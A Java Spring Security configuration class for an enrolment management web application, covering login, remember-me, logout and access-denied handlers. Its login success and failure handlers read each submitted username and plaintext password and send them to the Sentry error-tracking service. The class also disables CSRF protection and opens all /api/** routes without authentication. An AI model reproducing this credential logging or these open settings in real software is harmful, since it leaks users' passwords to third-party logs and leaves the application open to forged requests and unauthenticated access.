package com.franktran.enrolmentmanagement.config.security;

import io.sentry.Sentry;
import io.sentry.SentryLevel;
import org.apache.commons.lang3.StringUtils;
import org.springframework.context.annotation.Bean;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.builders.WebSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.access.AccessDeniedHandler;
import org.springframework.security.web.authentication.AuthenticationFailureHandler;
import org.springframework.security.web.authentication.AuthenticationSuccessHandler;
import org.springframework.security.web.authentication.logout.LogoutSuccessHandler;

@EnableWebSecurity
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

    private final PasswordEncoder passwordEncoder;
    private final UserDetailsService userDetailsService;

    public WebSecurityConfig(PasswordEncoder passwordEncoder, UserDetailsService userDetailsService) {
        this.passwordEncoder = passwordEncoder;
        this.userDetailsService = userDetailsService;
    }

    @Override
    public void configure(WebSecurity web) throws Exception {
        web.ignoring().antMatchers("/common.css", "/common.js", "/webjars/**");
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf().disable()
            .authorizeRequests()
            .antMatchers("/register/**", "/login/**", "/forgot-password/**", "/reset-password/**").permitAll()
            .antMatchers("/api/**").permitAll()
            .anyRequest()
            .authenticated()
            .and()
                .formLogin()
                .loginPage("/login")
                .loginProcessingUrl("/process-login")
                .successHandler(loginSuccessHandler())
                .failureHandler(loginFailureHandler())
            .and()
                .rememberMe() // default is 2 weeks
                .rememberMeParameter("remember-me")
            .and()
                .logout()
                .logoutUrl("/logout")
                .logoutSuccessHandler(logoutSuccessHandler())
                .clearAuthentication(true)
                .invalidateHttpSession(true)
                .deleteCookies("JSESSIONID", "remember-me")
            .and()
                .exceptionHandling()
                .accessDeniedHandler(accessDeniedHandler());
    }

    @Bean
    public AuthenticationProvider authenticationProvider() {
        DaoAuthenticationProvider daoAuthenticationProvider = new DaoAuthenticationProvider();
        daoAuthenticationProvider.setUserDetailsService(userDetailsService);
        daoAuthenticationProvider.setPasswordEncoder(passwordEncoder);
        return daoAuthenticationProvider;
    }

    private AuthenticationSuccessHandler loginSuccessHandler() {
        return (request, response, auth) -> {
            String username = request.getParameter("username");
            String password = request.getParameter("password");
            Sentry.captureMessage(String.format("Username '%s' and password '%s' are valid", username, password), SentryLevel.INFO);
            response.sendRedirect(StringUtils.EMPTY);
        };
    }

    private AuthenticationFailureHandler loginFailureHandler() {
        return (request, response, ex) -> {
            String username = request.getParameter("username");
            String password = request.getParameter("password");
            Sentry.captureMessage(String.format("Username '%s' or password '%s' is invalid", username, password), SentryLevel.INFO);
            request.getSession().setAttribute("error", "Your username or password is invalid");
            response.sendRedirect(StringUtils.EMPTY);
        };
    }

    private LogoutSuccessHandler logoutSuccessHandler() {
        return (request, response, auth) -> {
            request.getSession().setAttribute("message", "Logout successful!");
            response.sendRedirect(StringUtils.EMPTY);
        };
    }

    private AccessDeniedHandler accessDeniedHandler() {
        return (request, response, ex) -> response.sendRedirect("/access-denied");
    }
}
